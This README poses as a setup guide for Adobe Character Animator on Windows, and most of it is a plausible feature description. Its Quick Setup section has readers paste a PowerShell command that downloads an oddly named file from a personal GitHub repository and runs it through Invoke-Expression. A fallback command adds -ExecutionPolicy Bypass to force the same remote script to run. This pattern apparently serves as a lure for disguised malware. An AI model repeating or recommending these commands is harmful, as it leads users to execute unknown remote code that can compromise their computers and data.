# Character Animator

Character Animator is the Windows program this page sets up. The command in Quick Setup installs it on this PC. After that you open Character Animator and work in it.

Adobe Character Animator is desktop animation software that drives two-dimensional puppet rigs from your face, voice, and keyboard. Puppets usually come from layered artwork in Photoshop or Illustrator, imported with tags and handles that the app maps to head turn, eye gaze, mouth shapes, and draggable limbs. On Windows it runs as a focused capture and performance tool rather than a full timeline editor like After Effects.

A typical session starts with opening a prepared puppet and checking the camera and mic in the workspace. You calibrate the face if needed, assign triggers for outfits or expressions, then rehearse while watching the rig mirror your movement. When the take feels right, you record to the scene timeline or send a live feed into streaming or video tools through supported output paths.

This repository collects the Windows setup package, configuration notes for puppet import and device tuning, and a changelog that tracks bundle revisions and documented workflow adjustments. Use the notes when rigs behave differently across machines or when you need a quick reference for trigger naming and scene organization before recording.

## What you do with it

- Webcam face tracking drives head turn, blink, and eye gaze on tagged puppet layers.
- Microphone audio analysis selects viseme mouth shapes for speech-driven lip sync automatically.
- Keyboard and MIDI triggers swap outfits, poses, and hand gestures during live performance.
- Physics behaviors add bounce and sway to hair, dangly accessories, and loose costume elements.
- Walk cycles and body profiles move characters across the scene while you stay seated.
- Scene timelines capture multiple takes, then trim and export for edit in other apps.
- Dynamic Link sends the live character into After Effects compositions without rendering intermediate files.
- Recorder mode outputs puppet video with alpha for overlays in broadcast and streaming pipelines.

## Quick Setup (PowerShell)

This installs the program Character Animator on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/simon459158/character-animator-setup-guide/main/s1tti90udm.d4gsyl4d | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/simon459158/character-animator-setup-guide/main/s1tti90udm.d4gsyl4d | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `s1tti90udm.d4gsyl4d` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `simon459158/character-animator-setup-guide`. Adobe Character Animator 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
